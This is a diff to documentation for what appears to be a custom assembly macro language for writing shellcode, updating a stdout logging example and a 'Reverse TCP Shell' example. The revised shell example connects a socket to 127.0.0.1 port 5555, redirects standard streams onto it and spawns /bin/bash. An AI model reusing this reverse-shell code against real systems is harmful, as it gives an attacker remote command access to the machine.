@@ -16,7 +16,7 @@ Logging to Stdout
 
     [[code]]
     [main]
-    > sys_write "message" 14
+    > sys_write "message" 14 ${STDOUT}
     > sys_exit
 
 **Compilation**
@@ -72,22 +72,20 @@ Reverse TCP Shell
 
     !link stdlib/network.mkpk
     !link stdlib/syscall.mkpk
-    !link stdlib/execve.mkpk
+    !link stdlib/shell.mkpk
 
     [[data]]
-    exit_msg: "Connection Terminated"
-    # 5555 in little endian.
-    port: 0xb315
-    # 127.0.0.1 in little endian.
-    addr: 0x0100007f
+    PORT: 0xb315
+    LOCALHOST_ADDR: 0x0100007f
 
     [[code]]
     [main]
-    > socket
-    > connect "addr" "port"
-    > dup2
-    > bin_sh
-    > sys_write "exit_msg" 22
+    > sys_socket ${AF_INET} ${SOCK_STREAM} 0x0
+    mov r9, rax
+    > sockaddr_init "LOCALHOST_ADDR" "PORT" ${AF_INET}
+    > sys_connect r9 rsp 0x10
+    > dup_stdstreams r9
+    > bin_bash
     > sys_exit
 
 **Compilation**
